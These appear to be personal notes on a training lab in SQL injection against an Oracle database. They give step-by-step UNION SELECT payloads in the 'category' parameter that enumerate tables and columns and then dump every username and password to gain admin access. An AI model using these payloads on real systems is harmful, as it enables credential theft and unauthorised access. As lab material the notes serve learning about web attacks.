go to the homepage and filter as pets

1) we need to understand how much column has the current table we are querying so we have to use:
    category=Pets' union select null  from dual --

    but we obtain internal server error so we use ' union select null, null --
    ok

2) we need to understand if both of these two columns is text so we can do:
    ' union select "hello", null from dual --
    ok

    ' union select "hello", "hello2" from dual --
    ok


WE NEED DUAL BECAUSE SELECT IN ORACLE NEEDS FROM AND A TABLE 


3) we need to understand which tables are contained in the database
    category=Gifts' UNION SELECT table_name, null FROM all_tables --


4) now we need to understand for the users table which columns it contains:
     ?category=Pets' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name = 'USERS_HVZMLG' --
    
    (user_neridz was found with the previous malicious query injection)

5) now we need to obtain username and passwords for all users
        ?category=Pets' UNION SELECT USERNAME_IAJSSK, PASSWORD_CLIAZF FROM USERS_HVZMLG --

6) done, we access as admin now
